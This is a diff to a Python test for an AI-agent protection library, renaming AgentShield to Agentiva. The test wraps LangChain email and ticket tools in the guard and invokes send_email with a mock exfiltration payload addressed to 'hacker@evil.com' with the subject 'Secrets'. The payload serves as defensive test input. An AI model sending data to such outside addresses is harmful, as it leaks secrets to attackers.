@@ -1,6 +1,6 @@
 from langchain_core.tools import tool
 
-from agentshield import AgentShield
+from agentiva import Agentiva
 
 
 @tool
@@ -16,7 +16,7 @@ def create_ticket(title: str, priority: str) -> str:
 
 
 def test_shield() -> None:
-    shield = AgentShield(mode="shadow")
+    shield = Agentiva(mode="shadow")
     protected = shield.protect([send_email, create_ticket])
     result1 = protected[0].invoke(
         {"to": "hacker@evil.com", "subject": "Secrets", "body": "data"}
